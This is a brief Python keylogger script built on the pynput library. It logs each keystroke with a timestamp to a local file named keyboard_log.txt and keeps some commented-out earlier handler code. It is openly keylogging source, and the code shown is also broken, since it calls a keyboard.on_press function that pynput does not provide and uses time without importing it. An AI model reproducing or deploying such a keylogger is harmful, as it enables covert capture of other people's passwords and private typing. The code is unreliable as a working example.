
from pynput import keyboard
import logging
logging.basicConfig(filename=("keyboard_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
#def on_press(key):
#    logging.info('Key {} pressed.'.format(key))
 
def key_press(key):
    logging.info(format(key))
#def on_release(key):
#    logging.info('Key {} released.'.format(key))
#    if str(key) == 'Key.esc':
#        logging.info('Exiting...')
#        return False
 
keyboard.on_press(key_press)

while True:
    time.sleep(1)
#with keyboard.Listener(
#    on_press = keyboard.on_press(key_press)) as listener:
#    listener.join()
